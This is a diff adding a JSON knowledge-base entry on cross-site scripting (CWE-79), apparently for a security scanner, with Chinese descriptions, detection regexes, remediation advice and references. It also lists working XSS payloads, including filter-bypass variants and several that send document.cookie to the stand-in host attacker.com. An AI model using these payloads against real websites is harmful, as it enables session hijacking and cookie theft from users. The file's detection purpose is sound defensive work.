@@ -1,0 +1,84 @@
+{
+    "xss": {
+        "name": "跨站脚本攻击(XSS)",
+        "cwe_id": "CWE-79",
+        "cvss_base_score": 7.2,
+        "description": "XSS漏洞允许攻击者将恶意脚本注入到网页中，在其他用户浏览时执行",
+        "impact": "会话劫持、Cookie窃取、网页篡改、钓鱼攻击、恶意重定向",
+        "payloads": {
+            "reflected": [
+                "<script>alert('XSS')</script>",
+                "<script>alert(document.cookie)</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "<body onload=alert('XSS')>",
+                "<iframe src=\"javascript:alert('XSS')\">",
+                "<input onfocus=alert('XSS') autofocus>",
+                "<marquee onstart=alert('XSS')>",
+                "<details open ontoggle=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "\"onmouseover=\"alert('XSS')",
+                "'onmouseover='alert('XSS')",
+                "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+                "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">"
+            ],
+            "stored": [
+                "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+                "<img src=x onerror=\"new Image().src='http://attacker.com/steal?c='+document.cookie\">",
+                "<svg/onload=\"fetch('http://attacker.com/steal?c='+document.cookie)\">",
+                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
+            ],
+            "dom": [
+                "javascript:alert('XSS')",
+                "<img src=x onerror=alert('XSS')>",
+                "-alert('XSS')",
+                "\"><script>alert('XSS')</script>",
+                "'-alert('XSS')-'"
+            ],
+            "bypass": [
+                "<ScRiPt>alert('XSS')</sCrIpT>",
+                "<img src=x OnErRoR=alert('XSS')>",
+                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
+                "<img src=x onerror=\\u0061lert('XSS')>",
+                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
+                "<<script>alert('XSS')//<</script>",
+                "<script>x='ale';y='rt';z='(\\'XSS\\')';eval(x+y+z)</script>",
+                "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">"
+            ]
+        },
+        "detection_patterns": [
+            "render_template_string\\s*\\(.*\\+.*\\)",
+            "render_template_string\\s*\\(.*%.*\\)",
+            "Markup\\s*\\(.*request\\..*\\)",
+            "mark_safe\\s*\\(.*request\\..*\\)",
+            "HttpResponse\\s*\\(.*\\+.*\\)",
+            "Response\\s*\\(.*content.*request\\..*\\)",
+            "return\\s+.*\\+\\s*request\\.",
+            "document\\.write\\s*\\(.*\\+.*\\)",
+            "innerHTML\\s*=.*\\+.*",
+            "\\.html\\s*\\(.*\\+.*\\)"
+        ],
+        "safe_patterns": [
+            "escape\\s*\\(.*\\)",
+            "html\\.escape\\s*\\(.*\\)",
+            "markupsafe\\.escape\\s*\\(.*\\)",
+            "render_template\\s*\\(.*\\)",
+            "textContent\\s*=",
+            "innerText\\s*="
+        ],
+        "remediation": [
+            "对所有用户输入进行HTML实体编码",
+            "使用模板引擎的自动转义功能",
+            "设置Content-Security-Policy头",
+            "设置HttpOnly和Secure Cookie标志",
+            "使用X-XSS-Protection头",
+            "避免直接将用户输入插入DOM",
+            "使用DOMPurify等库清理HTML"
+        ],
+        "references": [
+            "https://owasp.org/www-community/attacks/xss/",
+            "https://cwe.mitre.org/data/definitions/79.html",
+            "https://portswigger.net/web-security/cross-site-scripting"
+        ]
+    }
+}
